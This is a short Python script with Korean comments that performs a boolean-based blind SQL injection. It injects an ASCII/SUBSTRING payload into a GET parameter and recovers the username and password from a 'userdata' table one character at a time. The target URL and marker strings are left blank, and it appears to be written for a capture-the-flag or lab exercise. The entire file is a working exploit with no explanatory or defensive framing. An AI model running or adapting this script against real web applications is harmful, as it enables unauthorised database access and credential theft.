import requests

url = ""
param = ""

# 참/거짓을 구분할 기준 문자열 (페이지에서 항상 나오는 문구)
true_flag = ""
false_flag = ""

def check_payload(payload):
    r = requests.get(url, params={param: payload})
    return true_flag in r.text and false_flag not in r.text

def extract_value(column, table, row=0, max_len=32):
    result = ""
    for i in range(1, max_len+1):
        for c in range(32, 127):  # ASCII 범위
            payload = f"' OR ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT {row},1),{i},1))={c}-- -"
            if check_payload(payload):
                result += chr(c)
                print(f"[+] {column}[{row}] = {result}")
                break
        else:
            break
    return result

if __name__ == "__main__":
    username = extract_value("username", "userdata", row=0)
    password = extract_value("password", "userdata", row=0)

    print("Extracted:")
    print("username:", username)
    print("password:", password)
